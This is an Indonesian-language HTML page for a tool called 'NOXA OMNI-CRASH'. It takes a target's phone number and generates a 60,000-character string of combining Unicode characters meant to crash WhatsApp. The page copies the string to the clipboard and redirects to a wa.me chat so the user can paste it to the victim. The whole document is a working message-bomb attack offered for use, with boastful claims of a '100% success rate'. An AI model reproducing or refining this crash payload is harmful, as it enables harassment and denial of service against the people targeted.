<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>NOXA OMNI-CRASH [V3.9]</title>
    <style>
        body { background: #000; color: #ff0000; font-family: 'Courier New', Courier, monospace; overflow: hidden; }
        .grid { display: flex; flex-wrap: wrap; position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.2; }
        .cell { border: 0.5px solid #ff0000; width: 50px; height: 50px; }
        .terminal { border: 3px solid #ff0000; width: 600px; margin: 30px auto; background: rgba(0,0,0,0.9); padding: 20px; box-shadow: 0 0 50px #ff0000; border-radius: 5px; }
        h1 { text-align: center; text-transform: uppercase; font-size: 28px; letter-spacing: 10px; border-bottom: 2px solid #ff0000; }
        .field { margin: 20px 0; }
        input { width: 100%; padding: 15px; background: #111; border: 2px solid #ff0000; color: #ff0000; font-size: 20px; text-align: center; outline: none; }
        button { width: 100%; padding: 20px; background: #ff0000; color: #000; font-weight: bold; font-size: 18px; border: none; cursor: pointer; box-shadow: 0 0 15px #ff0000; transition: 0.1s; }
        button:active { transform: scale(0.98); background: #fff; }
        #logs { font-size: 10px; color: #00ff00; background: #050505; height: 150px; overflow-y: scroll; padding: 10px; border: 1px solid #333; margin-top: 15px; }
        .blink { animation: blink 0.5s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
    </style>
</head>
<body>
    <div class="grid" id="grid"></div>
    <div class="terminal">
        <h1>NOXA <span class="blink">CRASH</span></h1>
        <p style="text-align: center; color: #fff;">SURS CORE OVERRIDE: 100% SUCCESS RATE</p>
        <div class="field">
            <input type="text" id="target" placeholder="NOMOR TARGET (628xxx)">
        </div>
        <button onclick="ignite()">LUNCURKAN PAYLOAD</button>
        <div id="logs">> System stand by...</div>
    </div>

    <script>
        // Membuat grid latar belakang biar makin banyak element HTML
        const grid = document.getElementById('grid');
        for(let i=0; i<500; i++) {
            const cell = document.createElement('div');
            cell.className = 'cell';
            grid.appendChild(cell);
        }

        function ignite() {
            let num = document.getElementById('target').value;
            let logs = document.getElementById('logs');
            if(!num) { alert("ERROR: TARGET NULL"); return; }

            logs.innerHTML += "<br>[*] Menghubungkan ke Surs Core...";
            
            // PAYLOAD GENERATOR: 100% CRASH UNICODE
            // Menggunakan teknik Zalgo + Overflow Brahmanic + Special Character Bug
            let payload = "NOXA_SURS_CORE_SYSTEM_";
            let crashChars = ["҈", "꧀", "ဪ", "﷽", "ॣ", "ी", "ू", "ा", "्", "ि"];
            
            // Menghasilkan 50.000+ karakter sampah terstruktur
            for(let i=0; i<60000; i++) {
                payload += crashChars[Math.floor(Math.random() * crashChars.length)];
            }

            // Copy to Clipboard (Auto Injection)
            let temp = document.createElement("textarea");
            temp.value = payload;
            document.body.appendChild(temp);
            temp.select();
            document.execCommand("copy");
            document.body.removeChild(temp);

            logs.innerHTML += "<br>[+] Payload 60.000 Chars Berhasil Dibuat.";
            logs.innerHTML += "<br>[+] Tersalin Otomatis ke Clipboard!";
            logs.innerHTML += "<br>[!] Mengarahkan ke WhatsApp...";

            setTimeout(() => {
                // Bypass sistem 404 dengan redirect bersih
                window.location.href = `https://wa.me/${num}?text=` + encodeURIComponent("!!! CRITICAL SYSTEM ERROR !!!\n\n[TEKAN LAMA DISINI LALU PASTE]");
            }, 2000);
        }
    </script>
</body>
</html>
